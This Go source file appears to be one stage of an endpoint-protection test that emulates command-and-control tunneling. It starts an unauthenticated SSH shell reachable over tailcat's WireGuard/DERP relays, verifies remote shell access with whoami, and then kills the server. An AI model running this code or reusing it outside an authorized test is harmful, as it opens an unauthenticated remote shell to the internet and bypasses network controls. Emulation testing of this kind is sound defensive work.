// Stage 2 — T1572 Protocol Tunneling + T1021.004 Remote Services: SSH
// (tactics: command-and-control, lateral-movement)
//
// Kothamine routes C2 through `tailcat serve no-auth-ssh` — an unauthenticated
// SSH shell carried inside tailcat's WireGuard data plane (NAT traversal via
// Tailscale's internet DERP relays; no account, no control plane, no open
// inbound port). This stage launches exactly that server as a child process,
// captures its ephemeral tailcat address from stderr, then proves shell access
// by connecting back as a client over the tunnel (`tailcat ssh <addr> whoami`)
// and comparing the output to a locally-executed whoami.
//
// SAFETY (load-bearing): the no-auth-ssh server is an internet-reachable
// unauthenticated shell whose address is the credential. Its lifetime is
// bounded to seconds: it is killed via defer (dies even on panic), killed
// explicitly after the proof, and every blocking wait is time-bounded.
//
// CLASSIFICATION INTEGRITY (CLAUDE.md Bug Prevention Rules 1/8):
//   - Missing tailcat binary (stage 1 never landed) or missing system ssh
//     client → 999 prerequisite failure, NOT a block. `tailcat ssh` drives the
//     system ssh client via ProxyCommand (Windows: ssh.exe from OpenSSH).
//   - Address never published within the wait window means the DERP bootstrap
//     (internet egress) did not complete — ambiguous → 999, never 126.
//   - 126 only on an OS-emitted denial when spawning processes; 127 only if
//     the tailcat binary vanishes mid-stage (os.Stat evidence).
//
// Exit codes: 0 = encrypted tunnel up and remote shell command verified,
//             126/127 = positive protection evidence, 999 = inconclusive.

//go:build windows || linux

package main

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"time"
)

const (
	TEST_UUID      = "c37d6a01-3934-4e72-9cb1-3dae284b937b"
	TECHNIQUE_ID   = "T1572"
	TECHNIQUE_NAME = "Protocol Tunneling + SSH over tailcat (no-auth-ssh)"
	STAGE_ID       = 2
)

const (
	serverAddrTimeout = 90 * time.Second // DERP bootstrap over internet egress
	sshClientTimeout  = 60 * time.Second
)

func main() {
	AttachLogger(TEST_UUID, fmt.Sprintf("Stage %d: %s", STAGE_ID, TECHNIQUE_ID))
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Starting %s", TECHNIQUE_NAME))
	LogStageStart(STAGE_ID, TECHNIQUE_ID, TECHNIQUE_NAME)

	code, detail := runStage()

	switch code {
	case StageSuccess:
		fmt.Printf("[STAGE %s] %s\n", TECHNIQUE_ID, detail)
		LogMessage("SUCCESS", TECHNIQUE_ID, detail)
		LogStageEnd(STAGE_ID, TECHNIQUE_ID, "success", detail)
	case StageBlocked, StageQuarantined, StageQuarantinedOnExec:
		fmt.Printf("[STAGE %s] %s\n", TECHNIQUE_ID, detail)
		LogMessage("WARN", TECHNIQUE_ID, detail)
		LogStageBlocked(STAGE_ID, TECHNIQUE_ID, detail)
	default:
		fmt.Printf("[STAGE %s] %s\n", TECHNIQUE_ID, detail)
		LogMessage("ERROR", TECHNIQUE_ID, detail)
		LogStageEnd(STAGE_ID, TECHNIQUE_ID, "error", detail)
	}
	os.Exit(code)
}

func runStage() (int, string) {
	// --- Prerequisites ---
	if _, err := os.Stat(tailcatPath()); err != nil {
		return StageError, fmt.Sprintf("tailcat binary not present at %s (stage 1 artifact missing): %v", tailcatPath(), err)
	}
	sshPath, err := exec.LookPath("ssh")
	if err != nil {
		return StageError, fmt.Sprintf("system ssh client not found in PATH (tailcat ssh uses it via ProxyCommand): %v", err)
	}
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Prerequisites met: tailcat=%s ssh=%s", tailcatPath(), sshPath))

	// --- Expected identity: run whoami locally for later comparison ---
	localWhoami := ""
	if out, err := exec.Command("whoami").Output(); err == nil {
		localWhoami = strings.TrimSpace(string(out))
	}
	if localWhoami == "" {
		return StageError, "local whoami produced no output; cannot verify remote shell identity"
	}

	// --- Launch the no-auth-ssh server (T1572 C2 tunnel listener) ---
	fmt.Printf("[STAGE %s] Starting 'tailcat serve no-auth-ssh' ...\n", TECHNIQUE_ID)
	LogMessage("INFO", TECHNIQUE_ID, "Launching tailcat no-auth-ssh server")
	srv, err := startTailcatServer("tailcat_ssh_server_output.txt", "serve", "no-auth-ssh")
	if err != nil {
		return classifyExecError(err), fmt.Sprintf("tailcat server could not start: %v", err)
	}
	serverStarted := time.Now()
	// GUARANTEED CLEANUP: the server is an unauthenticated shell — it must die
	// no matter how this stage exits (including panic).
	defer func() {
		srv.kill()
		LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("no-auth-ssh server terminated (lifetime %s)", time.Since(serverStarted).Round(time.Second)))
	}()
	LogProcessExecution(tailcatBinaryName(), strings.Join(srv.cmd.Args, " "), srv.cmd.Process.Pid, true, 0, "")

	// --- Capture the ephemeral address ---
	addr, err := srv.waitAddress(serverAddrTimeout)
	if err != nil {
		return StageError, fmt.Sprintf("no tailcat address published: %v", err)
	}
	fmt.Printf("[STAGE %s] Server listening, ephemeral address captured (%d chars)\n", TECHNIQUE_ID, len(addr))
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("no-auth-ssh server published address after %s", time.Since(serverStarted).Round(time.Second)))

	// --- Prove shell access over the tunnel (T1021.004) ---
	fmt.Printf("[STAGE %s] Connecting back over the tunnel: tailcat ssh <addr> whoami\n", TECHNIQUE_ID)
	ctx, cancel := context.WithTimeout(context.Background(), sshClientTimeout)
	defer cancel()
	out, code, runErr := runCaptured(ctx, "tailcat-ssh-client",
		exec.CommandContext(ctx, tailcatPath(), "ssh", addr, "whoami"),
		"tailcat_ssh_client_output.txt")

	if runErr != nil {
		return classifyExecError(runErr), fmt.Sprintf("tailcat ssh client could not run: %v", runErr)
	}
	if code != 0 {
		if _, serr := os.Stat(tailcatPath()); os.IsNotExist(serr) {
			return StageQuarantinedOnExec, "tailcat binary removed from disk mid-stage (os.Stat confirms quarantine)"
		}
		return StageError, fmt.Sprintf("tailcat ssh exited %d; output: %s", code, strings.TrimSpace(out))
	}

	// Windows whoami emits CRLF line endings; normalize and compare per line so
	// trailing "\r\n" (or extra ssh chatter in the captured stream) can never
	// poison an otherwise-positive proof.
	remoteWhoami := ""
	for _, line := range strings.Split(strings.ReplaceAll(out, "\r\n", "\n"), "\n") {
		line = strings.TrimSpace(line)
		if line != "" && strings.EqualFold(line, localWhoami) {
			remoteWhoami = line
			break
		}
	}
	if remoteWhoami == "" {
		return StageError, fmt.Sprintf("remote whoami output %q does not match local identity %q — cannot confirm shell access", strings.TrimSpace(out), localWhoami)
	}

	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Remote shell verified over WireGuard tunnel: whoami=%q matches local %q", remoteWhoami, localWhoami))

	// Explicit kill (defer is the backstop); prove the server is gone.
	srv.kill()
	lifetime := time.Since(serverStarted).Round(time.Second)

	return StageSuccess, fmt.Sprintf("Encrypted C2 tunnel established via DERP relays; unauthenticated SSH shell proven (whoami=%q); server killed after %s", remoteWhoami, lifetime)
}
